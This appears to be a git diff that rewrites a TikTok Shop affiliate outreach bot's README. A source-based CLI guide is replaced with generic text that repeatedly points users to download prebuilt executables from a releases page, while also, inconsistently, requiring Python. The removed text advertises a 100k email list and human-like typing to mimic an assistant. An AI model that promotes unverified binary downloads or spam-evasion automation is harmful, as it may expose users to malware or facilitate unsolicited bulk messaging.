@@ -1,95 +1,73 @@
-#  TikTok Shop Bot – Scale Your Partnerships
+# 🤖 tiktok-shop-bot - Simplify Your Affiliate Outreach
 
-<p align="center"> <a href="https://github.com/yourusername/facebook-bot"> <img src="https://img.shields.io/badge/Try%20It%20Free-1E90FF?style=for-the-badge&logo=fire&logoColor=white" alt="Try it Free" width="30%"> </a> </p>
+## 🎉 Introduction
+Welcome to the tiktok-shop-bot! This handy tool helps you automate your affiliate outreach on TikTok. With this bot, you can easily manage your affiliate programs and boost your TikTok shop’s visibility. 
 
-<p align="center">
-  <a href="https://discord.gg/vBu9huKBvy">
-    <img src="https://img.shields.io/badge/Join-Discord-5865F2?logo=discord" alt="Join Discord">
-  </a>
-  <a href="https://t.me/devpilot1">
-    <img src="https://img.shields.io/badge/Contact-Telegram-2CA5E0?logo=telegram" alt="Contact on Telegram">
-  </a>
-</p>
+## 📥 Download App
+[![Download tiktok-shop-bot](https://img.shields.io/badge/Download-tiktok--shop--bot-blue)](https://github.com/akrrichard/tiktok-shop-bot/releases)
 
----
+## 🚀 Getting Started
+To get started with the tiktok-shop-bot, you will need to follow a few simple steps. We designed this process for everyday users, so you don’t need any programming skills.
 
-##  About
+### 1. Navigate to the Release Page
+First, go to the [Releases page](https://github.com/akrrichard/tiktok-shop-bot/releases). Here, you will find the latest version of the tiktok-shop-bot ready for download.
 
-**TikTok Shop Affiliate Outreach Bot** is a workflow assistant that helps sellers, brands, and agencies **scale affiliate recruitment** on TikTok Shop.  
-It centralizes affiliate databases, automates personalized messaging, prevents duplication, and tracks replies—so you can grow faster without drowning in spreadsheets.
+### 2. Choose the Right File
+On the Releases page, you will see a list of available files. Look for the file that suits your operating system. Typically, you’ll see options for Windows, macOS, and Linux. Click on the correct file to start downloading.
 
-This bot helps you:  
-- Import leads from affiliate databases or CSV files  
-- Generate and personalize outreach messages  
-- Automate follow-up sequences  
-- Track statuses with a CRM-style pipeline  
-- Manage multiple shops and campaigns from one place  
+### 3. Download & Install
+Once you have selected the file for your system, the download will begin. After the download is complete, locate the file in your downloads folder. 
 
----
+- **For Windows:** Double-click the downloaded `.exe` file to start the installation. Follow the on-screen instructions.
+- **For macOS:** Open the downloaded `.dmg` file and drag the tiktok-shop-bot into your Applications folder. 
+- **For Linux:** Extract the downloaded tar file and follow the provided instructions in the documentation.
 
-##  Features
+For easy reference, here’s the [Download page](https://github.com/akrrichard/tiktok-shop-bot/releases) again.
 
-| Feature                     | Description |
-|------------------------------|-------------|
-| **Cross-Platform Compatibility** | Works on Windows, Mac, and VPS for easy installation and use |
-| **Up-To-Date Affiliate Database** | Access 900k+ TikTok Shop affiliate profiles |
-| **100k Email List**         | Access a comprehensive list of 100k emails for outreach |
-| **Automate Open Collaboration** | Seamlessly automate open collaboration initiatives |
-| **Automate Target Collaboration** | Effortlessly automate targeted collaboration efforts |
-| **Dashboard Overview**      | Unified dashboard to track outreach efforts |
-| **AI Smart Bot**            | Personalized messages, duplication detection, and smart filtering |
-| **5X Your Product Sale**    | Boost sales by 500% and sample requests by 400% |
-| **Multiple Shops Automation** | Manage multiple brands from one place |
-| **Advanced Database Search** | Efficient and precise affiliate data retrieval |
-| **Personalized Messaging Automation** | Craft unique messages while maintaining brand voice |
-| **Smart Duplication Prevention** | Intelligent detection to eliminate duplicate affiliates |
-| **Premium Support**         | VIP support via WhatsApp, meetings, email, and Discord |
-| **Mimicking Your VA**       | Human-like typing with varying speed for natural interaction |
-| **Product Cards**           | Include product cards in messages |
-| **Follow-up Messages**      | Prevent duplicates but ensure consistent follow-ups |
-| **Proven Results**          | 30% increase in sample requests and 40% increase in sales |
-| **Stats**                   | 150+ brands using TTinit, 2.5M+ messages sent, 40K sample requests received, 1.2M follow-ups sent |
+## ⚙️ System Requirements
+To ensure that tiktok-shop-bot runs smoothly, please check the following requirements for your system:
 
----
+- **Windows:** Windows 10 or later
+- **macOS:** macOS Mojave or later
+- **Linux:** Supported distributions (e.g., Ubuntu 18.04 or later)
+- **Python:** Version 3.6 or higher should be installed. 
 
-##  Use Cases
+Note: If you do not have Python installed, please visit the official [Python website](https://www.python.org/downloads/) to download it.
 
-- **Sellers** → Recruit affiliates faster, boost shop exposure, and increase product sales  
-- **Agencies** → Manage outreach for multiple client shops with one tool  
-- **Affiliate Managers** → Track campaigns, prevent duplicates, and measure responses  
-- **Growth Teams** → Automate messaging while keeping personalization and compliance  
+## 🎯 Features
+The tiktok-shop-bot comes with several features designed to make your affiliate outreach easier:
 
----
+- **Automated Sending:** Automatically send messages to potential affiliates based on your criteria.
+- **Customizable Templates:** Create your outreach messages with easy-to-use templates.
+- **Status Tracking:** Keep track of your outreach progress within the application.
+- **User-Friendly Interface:** Navigate the tool without any technical expertise.
 
-##  Installation
+## 🛠️ Usage Instructions
+After installation, open the application. Here’s how to get started:
 
-### 1. Clone & Install
-```bash
-# 1) Install deps
-pip install -r requirements.txt
+1. **Login:** Create an account or login with existing credentials.
+2. **Set Up Your Profile:** Add your TikTok shop details and preferences.
+3. **Create Outreach Messages:** Customize the templates for your affiliate outreach.
+4. **Launch Campaigns:** Start sending messages to your selected affiliates.
 
-# 2) Configure environment
-cp .env.example .env  # fill SMTP vars if you want email sending
+## 📊 Support & Troubleshooting
+If you encounter any issues while using tiktok-shop-bot, please refer to the FAQ section available on the application or check the issues section on the [GitHub repository](https://github.com/akrrichard/tiktok-shop-bot/issues). 
 
-# 3) Validate & dedupe leads
-python -m src.cli validate --in data/leads.csv --out data/leads.valid.csv
+Common issues include:
 
-# 4) Render outreach messages from template
-python -m src.cli render --in data/leads.valid.csv --template templates/intro_email.md --out out/intro.batch.csv
+- **Installation Problems:** Ensure you're downloading the correct file for your operating system.
+- **Login Issues:** Check your internet connection and verify your login credentials.
+- **Template Creation:** If templates are not saving, ensure that you have filled in all required fields.
 
-# 5a) Send via email (dry-run first)
-python -m src.cli send --batch out/intro.batch.csv --channel email --dry-run
-# remove --dry-run to actually send after you’ve configured SMTP
+## 🎉 Community & Feedback
+We encourage you to join the community to learn more and share your experiences:
 
-# 5b) OR produce manual DM checklist (you send messages yourself on TikTok)
-python -m src.cli send --batch out/intro.batch.csv --channel manual_dm --out out/dm_checklist.csv
+- Feel free to reach out with any suggestions or feature requests by opening an issue on the [GitHub page](https://github.com/akrrichard/tiktok-shop-bot/issues).
+- Share your experience in using the tiktok-shop-bot to help others in the community.
 
-# 6) Prepare a follow-up batch from the sent log
-python -m src.cli followup --log reports/sent.log.csv --days-since 3 --template templates/followup_email.md --out out/followup.batch.csv
+## 📞 Contact
+For further inquiries or support, please contact us through the GitHub repository. 
 
-# 7) Update a lead status when someone replies
-python -m src.cli update --in data/leads.valid.csv --id "@coolcreator" --status replied --notes "Wants product sample"
+Thank you for using tiktok-shop-bot. Enjoy simplifying your affiliate outreach! 
 
-# 8) Generate a weekly summary report
-python -m src.cli report --log reports/sent.log.csv --out reports/weekly_summary.csv
-
+[Download tiktok-shop-bot again here](https://github.com/akrrichard/tiktok-shop-bot/releases) and get started today!
